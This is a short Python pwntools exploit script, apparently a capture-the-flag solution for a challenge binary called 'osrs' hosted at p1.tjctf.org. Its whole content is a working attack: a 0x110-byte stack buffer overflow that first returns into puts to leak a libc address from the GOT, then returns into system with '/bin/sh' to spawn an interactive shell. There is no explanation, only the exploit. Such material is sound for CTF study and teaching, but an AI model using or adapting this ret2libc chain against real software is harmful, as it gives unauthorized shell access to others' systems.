from pwn import *

e = ELF("./osrs")
libc = ELF("./libc.so")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("p1.tjctf.org", 8006)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

p.sendlineafter(":", "A" * 0x110 + p32(e.symbols["puts"]) + p32(e.symbols["main"]) + p32(e.got["puts"]))
p.recvuntil(":(")
p.recvline()

leak = u32(p.recv(4)) - libc.symbols["puts"]
print(hex(leak))

p.sendlineafter(":", "A" * 0x110 + p32(leak + libc.symbols["system"]) + p32(0) + p32(leak + next(libc.search("/bin/sh"))))

debug()

p.interactive()
